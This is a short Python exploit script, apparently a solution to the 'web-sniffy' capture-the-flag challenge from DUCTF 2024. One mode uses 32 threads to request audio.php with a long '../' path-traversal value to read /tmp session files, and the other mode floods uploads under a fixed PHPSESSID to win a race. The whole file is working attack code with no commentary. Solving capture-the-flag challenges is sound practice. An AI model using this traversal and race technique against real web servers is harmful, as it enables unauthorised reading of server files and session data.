import sys
import time
import requests
from base64 import b64encode
from multiprocessing.dummy import Pool as ThreadPool

# url = "http://localhost:5555/"
url = "https://web-sniffy-d9920bbcf9df.2024.ductf.dev"
SESSID = "w3b"
def runner1(i):
    while True: 
        r = requests.get(
            f"{url}/audio.php?f=../../../../../../../../../../../tmp/{SESSID}",
            cookies={"PHPSESSID": SESSID},
        )
        if r.status_code == 200:
            print(r.text)

def runner2(i):
    while True: 
        requests.post(
            f"{url}/audio.php?f=k1.mp3",
            cookies={"PHPSESSID": SESSID},
            files={"file": open("src/audio/k1.mp3", "rb")}
        )



if sys.argv[1] == '1':
    runner = runner1
else:
    runner = runner2

pool = ThreadPool(32)
result = pool.map_async( runner, range(32) ).get(0xffff)
